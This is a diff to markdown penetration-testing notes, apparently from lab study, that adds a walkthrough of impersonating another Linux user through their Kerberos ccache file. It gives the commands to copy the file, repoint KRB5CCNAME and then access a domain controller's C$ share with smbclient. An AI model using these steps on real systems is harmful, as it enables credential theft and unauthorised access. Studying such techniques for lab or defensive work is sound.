@@ -408,7 +408,21 @@ $ env | grep -i krb5
 KRB5CCNAME=FILE:/tmp/...
 ```
 Each time a user logs in and authenticated via Kerberos, a cache file is created for them. If we have privileges to read the files (normally root) then we can impersonate any user that is authenticated.
+To impersonate another user, we just require read access to their ccache file. If we have this, we can make a copy of their file and then change the `KRB5CCNAME` env var to point to this copy. Then it will be used for all future Kerberos authentication.
+```sh
+# We can see the user julio has a ccache file
+$ ls -la /tmp
+-rw-------  1 julio@inlanefreight.htb            domain users@inlanefreight.htb 1406 Oct  7 11:35 krb5cc_647401106_HRJDux
 
+$ cp /tmp/krb5cc_647401106_HRJDux /root/
+$ export KRB5CCNAME=/root/krb5cc_647401106_HRJDux
+$ klist
+Ticket cache: FILE:/root/krb5cc_647401106_HRJDux
+Default principle: julio.inlanefreight.htb
+
+$ smbclient //dc01/C$ -k -c ls -no-pass
+```
+> `ccache` files have expiration dates, the `klist` command will tell us these dates.
 #### Abusing KeyTab files
 ```sh
 # List information about a keytab file (incl. who it belongs too a.k.a the principle name)
